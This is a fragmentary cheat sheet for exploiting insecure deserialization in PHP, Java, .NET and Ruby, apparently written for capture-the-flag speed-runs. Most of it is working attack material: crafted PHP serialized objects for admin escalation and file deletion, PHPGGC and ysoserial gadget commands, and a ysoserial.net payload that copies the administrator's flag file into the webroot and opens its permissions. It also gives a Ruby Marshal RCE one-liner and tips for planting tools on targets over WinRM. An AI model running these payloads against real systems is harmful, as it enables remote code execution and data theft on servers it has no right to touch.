...
### Basic Privilege Escalation (2-3 min)
...
# 3. Re-encode
echo -n 'O:4:"User":2:{s:8:"username";s:6:"victim";s:5:"admin";b:1;}' | base64

# 4. Replace cookie and access /admin
```

### Type Juggling (3-5 min)
...
### Object Injection (5-10 min)

**Quick Exploit:**
```php
<?php
echo base64_encode('O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:20:"/var/www/html/flag.txt";}');
?>
```

### PHPGGC Exploitation (15-20 min)
...
# 3. Generate payload
./phpggc Symfony/RCE4 exec 'id' | base64 -w 0 > payload.txt
...
java -jar ysoserial-all.jar \
  ...
  CommonsCollections4 'id' | base64 -w 0
...
**Java 15 and below:**
```bash
java -jar ysoserial-all.jar CommonsCollections4 'id' | base64 -w 0
```
...
## .NET Deserialization - 10 Minute Exploitation (BinaryFormatter / ysoserial.net)

### Sink red flags to grep for in decompiled .NET source
Any of these on attacker-controlled bytes/strings is unauth RCE:
```csharp
new BinaryFormatter().Deserialize(stream);                  // RCE
new LosFormatter().Deserialize(stream_or_string);           // RCE
new NetDataContractSerializer().ReadObject(stream);         // RCE
new ObjectStateFormatter().Deserialize(string);             // RCE
new SoapFormatter().Deserialize(stream);                    // RCE
JavaScriptSerializer(new SimpleTypeResolver()).Deserialize  // RCE if TypeResolver enabled
TypeNameHandling = TypeNameHandling.All / Auto / Objects    // Json.NET RCE
DataContractJsonSerializer w/ KnownTypes user-controlled    // RCE
```
- **Per-connection-stateless protocols + RequestType discrimination = auth bypass.** If
  the server processes the deserialization branch BEFORE checking the auth state of the
  connection (because each request carries its own RequestType enum independent of any
  session), the malicious payload reaches `Deserialize()` even on the unauth path.
- Decompile any TCP/HTTP-protocol DLL with `ilspycmd` / `dnSpy` / `dotPeek` and search for
  `Deserialize(` — it usually surfaces in <1 minute.

### ysoserial.net (5-15 min)

**Quick Exploit:**
```bash
# Precompiled binary (recommended — building from source on macOS/Linux fails because
# the WPF gadget assemblies aren't in dotnet-net-core):
wget https://github.com/pwntester/ysoserial.net/releases/latest/download/ysoserial-1.36.zip
unzip ysoserial-1.36.zip

# Generate a BinaryFormatter gadget. TextFormattingRunProperties is the default
# "always-works" gadget for any .NET Framework target with WPF assemblies loaded
# (which most servers have):
mono ./ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter \
  -c 'cmd /c whoami > C:\Windows\Temp\out.txt' -o base64

# Other gadgets to try if TextFormattingRunProperties fails:
#   TypeConfuseDelegate    — universal but verbose
#   WindowsIdentity        — needs WPF, often the lightest payload
#   PSObject               — works on Exchange / PS-host targets
#   DataSet                — XAML-style chain
mono ./ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'whoami' -o base64
```

**Submit through the protocol envelope** that reaches `Deserialize()`. Whether the
sink is at `req.Payload` or `req.Body` or a base64 query parameter, just paste the
ysoserial output into that field.

**"Exception has been thrown by the target of an invocation" is SUCCESS, not failure.**
The gadget executes BEFORE the deserializer tries to construct the object; the
exception is the gadget's effect rippling up through reflection. If you see this
exception in the response, the command DID run — verify out-of-band (file written /
DNS callback / WinRM-readable artifact).

**Generation gotcha on macOS/Linux**: `dotnet ./ysoserial.dll` fails with
`PresentationFramework not found` for WPF-style gadgets. Workarounds (in order):
1. Use the precompiled `ysoserial.exe` via `mono` (above) — works on macOS/Linux.
2. Drop the precompiled `ysoserial.exe` on the TARGET via WinRM (you usually have
   shell access by the time you need a gadget) and generate the payload there.
3. Use a Windows VM.

**Payload selection rule**: when WinRM is already available, prefer file-copy /
icacls payloads over reverse shells. The deserialization runs in a possibly-restricted
thread context that can lose stdout/stderr — copy the flag to a readable location and
pull it via WinRM:
```bash
mono ./ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -o base64 \
  -c 'cmd /c copy C:\Users\Administrator\Desktop\root.txt C:\inetpub\wwwroot\r.txt && icacls C:\inetpub\wwwroot\r.txt /grant Everyone:F'
# Then: GET http://target/r.txt   → flag
```

### .NET hashcat / cracking — N/A
Unlike Java, .NET deserialization gadgets don't typically produce hashes — the RCE
runs at deserialize time. Skip the cracking step.

---

## Ruby Deserialization - 10 Minute Exploitation

### Ruby Gadget Chain (10-15 min)
...
stub_spec.instance_variable_set(:@loaded_from, "|id")
...
## Expert Techniques - Speed Run

### PHP Custom Gadget Chain (20-30 min)

**Quick Steps:**
1. Get source backup files: `CustomTemplate.php~`, `DefaultMap.php~` (many editors leave `.php~` backups)
...
$ref->getProperty('default_desc_type')->setValue($exploit, 'id');
...
### Java Deserialization + SQL Injection (30-45 min)

**Quick Steps:**
1. Get source: look for `/backup/` or `.java.bak` files containing the serializable class
...
**Fix:** Update string lengths — the number must match the actual string length
```php
# "administrator" is 13 characters
s:13:"administrator"
# "/tmp/target.txt" is 15 characters
s:15:"/tmp/target.txt"
```
...
### PHP Object Injection (file deletion target)
```bash
# Replace /path/to/target with actual path — set string length accordingly
echo -n 'O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:17:"/tmp/target_file";}' | base64
```
...
### Ruby RCE
```bash
ruby -e 'require"base64";s=Gem::StubSpecification.new;s.instance_variable_set(:@loaded_from,"|id");i=Gem::Resolver::InstallerSet.new(:both);i.instance_variable_set(:@always_install,[s]);r=Gem::RequestSet.new;r.instance_variable_set(:@sets,[i]);puts Base64.strict_encode64(Marshal.dump(r))'
```
